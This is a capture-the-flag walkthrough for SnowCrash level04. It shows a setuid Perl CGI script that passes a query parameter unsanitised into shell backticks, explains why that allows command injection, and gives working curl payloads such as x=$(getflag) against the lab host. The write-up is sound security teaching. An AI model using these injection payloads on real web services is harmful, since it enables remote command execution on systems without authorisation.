# LEVEL04

# Analysis

```
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```

*.pl is the usual filename extension for Perl scripts. Short primer so you know what it is, how to run/inspect one safely, and what to watch out for. ".pl" is just a convention — Perl will run any text file containing valid Perl code. Common uses: quick system scripts, text processing, CGI web scripts, small utilities.


To check the first 40 lines we can use the command "sed -n '1,40p' level04.pl".
```bash
    level04@SnowCrash:~$ sed -n '1,40p' level04.pl
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
    }
    x(param("x"));
```

It reads a CGI parameter named x (param('x')). It passes that value into Perl backticks: `echo $y 2>&1`.
Perl interpolates $y into the command string and then the shell runs echo <value> — so whatever you supply
becomes part of a shell command. There is no sanitization. That means an attacker-controlled x value can 
inject shell metacharacters and run arbitrary commands on the server.
This is a classic command injection / remote code execution vulnerability.

## Solution
The easiest is to use a curl invocation that issues an HTTP GET to the URL 192.168.186.130:4747 with query parameter x=....

```bash
    level04@SnowCrash:~$ curl '192.168.186.130:4747?x=$(getflag)'
    Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
```

Single quotes '...' prevent expansion — the literal characters $(getflag) are sent. The command we used sends the literal string $(getflag) as x, whereas curl "http://192.168.186.130:4747?x=$(getflag)" runs getflag locally, substitutes its output, then calls curl.

this  curl --get --data-urlencode 'x=$(getflag)' http://192.168.186.130:4747 would work too.
